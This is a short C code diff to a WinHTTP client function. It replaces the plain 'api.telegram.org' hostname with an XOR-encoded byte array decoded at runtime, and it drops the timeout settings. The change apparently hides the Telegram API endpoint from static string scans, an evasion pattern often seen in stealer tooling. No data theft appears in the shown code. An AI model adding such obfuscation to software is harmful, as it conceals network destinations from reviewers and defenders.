@@ -81,8 +81,12 @@ int telegram_http_init(void)
                               WINHTTP_NO_PROXY_BYPASS, 0);
     }
     if (session) {
-        WinHttpSetTimeouts(session, 5000, 5000, 5000, 15000);
-        connection = WinHttpConnect(session, L"api.telegram.org",
+        static const unsigned char enc_tg_domain[] = {59, 42, 51, 116, 46, 63, 54, 63, 61, 40, 59, 55, 116, 53, 40, 61};
+        wchar_t tg_domain[20] = {};
+        for (size_t i = 0; i < sizeof(enc_tg_domain); ++i) {
+            tg_domain[i] = (wchar_t)(enc_tg_domain[i] ^ 0x5A);
+        }
+        connection = WinHttpConnect(session, tg_domain,
                                     INTERNET_DEFAULT_HTTPS_PORT, 0);
     }
     if (!session || !connection) {
